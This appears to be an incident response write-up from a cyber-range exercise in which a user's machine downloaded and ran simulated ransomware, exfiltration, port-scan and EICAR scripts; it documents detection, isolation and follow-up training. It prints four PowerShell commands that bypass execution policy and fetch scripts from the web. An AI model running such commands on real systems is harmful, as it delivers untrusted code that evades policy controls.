## Incident Response Report: PowerShell Suspicious Web Request

Incident ID: IR20250623-001

Date: June 23, 2025

---

### Detection and Analysis

On June 23, 2025, an incident titled "**PowerShell Suspicious Web Req.**" was triggered on **windows-target-1**. The alert indicated that **four different PowerShell scripts** were downloaded via `Invoke-WebRequest` commands. The incident was triggered by **one user** on this single device.

The following PowerShell commands were executed:

- `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
- `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`
- `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`
- `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1`

Upon contacting the affected user, they stated that they attempted to install "free software," observed a momentary black screen, and then "nothing happened."

Further investigation using **Microsoft Defender for Endpoint (MDE)** confirmed that the downloaded scripts did run. The following KQL query was used to verify script execution:

Code snippet;
````sql
`let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
| summarize Count = count() by AccountName, DeviceName, FileName, ProcessCommandLine`

The downloaded scripts were submitted to the malware reverse engineering team, who provided the following analysis:

- **pwncrypt.ps1:** A PowerShell script simulating ransomware encryption.
- **eicar.ps1:** A PowerShell script designed to generate the EICAR test file for antivirus testing.
- **portscan.ps1:** A PowerShell script for performing network port scanning.
- **exfiltratedata.ps1:** A PowerShell script simulating data exfiltration.

---

### Containment, Eradication, and Recovery

1. The affected machine, **windows-target-1**, was immediately **isolated** in Microsoft Defender for Endpoint.
2. A full anti-malware scan was initiated on the isolated machine.
3. After the scan completed with no detected threats, the machine was **removed from isolation**.

---

### Post-Incident Activities

1. The affected user was enrolled in **additional cybersecurity awareness training**, and the organization's training package with KnowBe4 was upgraded.
2. Implementation of a new policy restricting PowerShell usage for non-essential users has begun to prevent similar incidents.
